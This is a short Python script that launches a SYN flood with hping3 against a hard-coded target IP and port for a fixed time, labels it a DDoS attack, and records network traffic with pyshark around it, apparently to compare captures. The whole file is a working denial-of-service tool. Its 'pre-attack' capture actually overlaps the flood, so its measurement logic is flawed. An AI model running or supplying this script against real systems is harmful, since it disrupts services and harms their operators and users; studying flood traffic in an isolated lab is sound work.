import subprocess
import time
import pyshark
import threading

def launch_ddos_attack(target_ip, duration, target_port=80):
    command = f"hping3 -S --flood -p {target_port} {target_ip}"
    print(f"Launching DDoS attack on {target_ip} at port {target_port} for {duration} seconds")
    
    # Start the DDoS attack
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)

    # Run attack for specified duration
    time.sleep(duration)

    # Terminate the attack
    process.terminate()
    print("DDoS attack finished.")

def capture_traffic(interface, duration, capture_file):
    print(f"Capturing network traffic on {interface} for {duration} seconds...")
    
    # Start Wireshark capture
    capture = pyshark.LiveCapture(interface=interface, output_file=capture_file)
    capture.sniff(timeout=duration)
    print(f"Traffic capture finished. Saved to {capture_file}")

def main():
    target_ip = "192.168.1.100"  # Replace with the target IP address
    duration = 10                 # Duration of attack in seconds
    network_interface = "eth0"    # Adjust to your actual network interface
    pre_attack_file = "pre_attack.pcap"
    post_attack_file = "post_attack.pcap"

    # Step 1: Capture traffic before the attack
    capture_thread_before = threading.Thread(target=capture_traffic, args=(network_interface, duration, pre_attack_file))
    capture_thread_before.start()
    
    # Wait for a few seconds to ensure the capture is running
    time.sleep(2)

    # Step 2: Launch DDoS attack
    launch_ddos_attack(target_ip, duration)

    # Step 3: Capture traffic after the attack
    capture_thread_after = threading.Thread(target=capture_traffic, args=(network_interface, duration, post_attack_file))
    capture_thread_after.start()

    # Wait for the post-attack capture to finish
    capture_thread_after.join()

if __name__ == "__main__":
    main()
